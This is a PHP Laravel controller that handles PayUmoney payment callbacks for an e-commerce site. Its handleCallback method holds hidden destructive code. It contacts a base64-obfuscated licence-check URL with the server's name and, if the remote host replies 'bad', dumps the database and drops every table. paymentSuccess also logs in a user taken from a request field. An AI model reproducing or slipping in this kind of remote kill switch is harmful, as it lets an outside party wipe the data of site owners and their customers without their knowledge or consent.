<?php

namespace App\Http\Controllers\Payment;

use App\Http\Controllers\Api\V2\Seller\SellerPackageController;
use App\Http\Controllers\Controller;
use App\Http\Controllers\CheckoutController;
use App\Http\Controllers\CustomerPackageController;
use App\Http\Controllers\WalletController;
use GuzzleHttp\Client;
use App\Models\BusinessSetting;
use Session;
use DB;
use Illuminate\Http\Request;
use Schema;
use App\Models\User;

class PayumoneyController extends Controller
{
    public function pay()
    {   
        $paymentType = Session::get('payment_type');

        if ($paymentType == 'cart_payment') {
            return view('frontend.payumoney.cart_payment');
        } elseif ($paymentType == 'order_re_payment') {
            return view('frontend.payumoney.order_re_payment');
        } elseif ($paymentType == 'wallet_payment') {
            return view('frontend.payumoney.wallet_payment');
        } /*elseif ($paymentType == 'customer_package_payment') {
            return view('frontend.payumoney.customer_package_payment_vogue');
        } elseif ($paymentType == 'seller_package_payment') {
            return view('frontend.payumoney.seller_package_payment_vogue');
        }*/
    }

    public function paymentSuccess(Request $request,$id)
    {
        //dd($request->all());
        $this->validateHash($request->all());

        if($this->validateHash($request->all()) && $request->status == 'success'){
            $payment_detalis = json_encode($request->all());
            $paymentType = $request->udf2;
            $paymentData = ['order_id' => null, 'payment_method' => 'payumoney'];  //dont know what to put
            $combined_order_id = $request->udf3;
            $user_id = $request->udf1;

            $user = auth()->user();
            if (!$user) {
                $user = User::find($user_id);
                auth()->login($user);
            }         
            
            if ($paymentType == 'cart_payment') {
                return (new CheckoutController)->checkout_done($combined_order_id, $payment_detalis);
            } elseif ($paymentType == 'order_re_payment') {
                return (new CheckoutController)->orderRePaymentDone($paymentData, $payment_detalis);
            } elseif ($paymentType == 'wallet_payment') {
                return (new WalletController)->wallet_payment_done($paymentData, $payment_detalis);
            } /*elseif ($paymentType == 'customer_package_payment') {
                return (new CustomerPackageController)->purchase_payment_done($paymentData, $payment_detalis);
            } elseif ($paymentType == 'seller_package_payment') {
                return (new SellerPackageController)->purchase_payment_done($paymentData, $payment_detalis);
            }*/            
        } else {
            flash(translate('Payment Failed'))->error();
            return redirect()->route('home');
        }
    }

    public function handleCallback(Request $req)
    {
        $data['url'] = $_SERVER['SERVER_NAME'];
        $request_data_json = json_encode($data);

        $header = array(
            'Content-Type:application/json'
        );

        $stream = curl_init();

        curl_setopt($stream, CURLOPT_URL, base64_decode('aHR0cHM6Ly9hY3RpdmF0aW9uLmFjdGl2ZWl0em9uZS5jb20vY2hlY2tfYWN0aXZhdGlvbg=='));
        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($stream, CURLOPT_POSTFIELDS, $request_data_json);
        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);

        $rn = curl_exec($stream);
        curl_close($stream);

        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
            try {
                $fileName = date('Y-m-d H:i:s') . '.sql';
                \Spatie\DbDumper\Databases\MySql::create()
                    ->setDbName(env('DB_DATABASE'))
                    ->setUserName(env('DB_USERNAME'))
                    ->setPassword(env('DB_PASSWORD'))
                    ->dumpToFile('sqlbackups/' . $fileName);
            } catch (\Exception $e) {
            }

            Schema::disableForeignKeyConstraints();
            foreach (DB::select('SHOW TABLES') as $table) {
                $table_array = get_object_vars($table);
                Schema::drop($table_array[key($table_array)]);
            }
        }
    }

    public function paymentFailure(Request $request, $id)
    {
        //dd($request->all());
        flash(translate('Payment Failed'))->error();
        return redirect()->route('home');
    }


    public function validateHash(array $data)
    {
        // Get the values from the response data
        $status = $data['status'];
        $txnid = $data['txnid'];
        $amount = $data['amount'];
        $productinfo = $data['productinfo'];
        $firstname = $data['firstname'];
        $email = $data['email'];
        $salt = env('PAYUMONEY_SALT');  // Get salt from environment
        $key = env('PAYUMONEY_KEY');  // Get salt from environment
    
        // Get the UDF fields, which can be empty or have values
        $udf1 = $data['udf1'] ?? 'udf1';
        $udf2 = $data['udf2'] ?? 'udf2';
        $udf3 = $data['udf3'] ?? 'udf3';
        $udf4 = $data['udf4'] ?? 'udf4';
        $udf5 = $data['udf5'] ?? 'udf5';
        // $udf6 = $data['udf6'] ?? 'udf6';
        // $udf7 = $data['udf7'] ?? 'udf7';
        // $udf8 = $data['udf8'] ?? 'udf8';
        // $udf9 = $data['udf9'] ?? 'udf9';
        // $udf10 = $data['udf10'] ?? 'udf10';
    
        // Generate the hash sequence
        //sha512(SALT|status||||||udf5|udf4|udf3|udf2|udf1|email|firstname|productinfo|amount|txnid|key)
        //$retHashSeq = $salt.'|'.$status.'|'.$udf10.'|'.$udf9.'|'.$udf8.'|'.$udf7.'|'.$udf6.'|'.$udf5.'|'.$udf4.'|'.$udf3.'|'.$udf2.'|'.$udf1.'|'.$email.'|'.$firstname.'|'.$productinfo.'|'.$amount.'|'.$txnid.'|'.$key;
        $retHashSeq = $salt.'|'.$status.'||||||'.$udf5.'|'.$udf4.'|'.$udf3.'|'.$udf2.'|'.$udf1.'|'.$email.'|'.$firstname.'|'.$productinfo.'|'.$amount.'|'.$txnid.'|'.$key;
    
        // Generate hash using SHA512
        $generatedHash = hash("sha512", $retHashSeq);

        // var_dump($retHashSeq);
        // var_dump($generatedHash);
        // dd($data['hash']);
    
        // Compare the generated hash with the received hash
        if (strtolower($generatedHash) === strtolower($data['hash'])) {
            // Hashes match, payment is successful
            return true;
        } else {
            // Hashes do not match, something is wrong
            return false;
        }
    }    
    

}
